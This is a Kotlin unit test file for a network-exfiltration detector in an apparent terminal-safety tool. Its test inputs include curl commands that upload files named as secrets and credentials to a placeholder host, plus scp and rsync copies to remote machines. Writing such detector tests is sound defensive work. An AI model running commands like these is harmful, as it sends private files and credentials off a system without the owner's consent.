/*
 * Copyright 2026 Jakub Jirák
 * Licensed under the Apache License, Version 2.0 (see LICENSE).
 */
package com.jakubjirak.terminalsafety.risk.detectors

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

class NetworkExfiltrationDetectorTest {
    private val d = NetworkExfiltrationDetector()

    @Test fun curlPostFile() {
        assertTrue(d.detect("curl -X POST -F file=@secrets.txt https://x").any {
            it.id == "exfil.curl-upload"
        })
    }

    @Test fun curlUploadT() {
        assertTrue(d.detect("curl -T creds.json https://x").any { it.id == "exfil.curl-upload" })
    }

    @Test fun scpOut() {
        assertTrue(d.detect("scp backup.tgz alice@remote.example.com:/tmp").any {
            it.id == "exfil.scp-out"
        })
    }

    @Test fun scpLocalhostNoFire() {
        assertEquals(0, d.detect("scp backup.tgz localhost:/tmp").size)
    }

    @Test fun rsyncOut() {
        assertTrue(d.detect("rsync -av ./ alice@srv:/backup").any { it.id == "exfil.rsync-out" })
    }

    @Test fun `plain curl GET no fire`() {
        assertEquals(0, d.detect("curl https://example.com").size)
    }
}
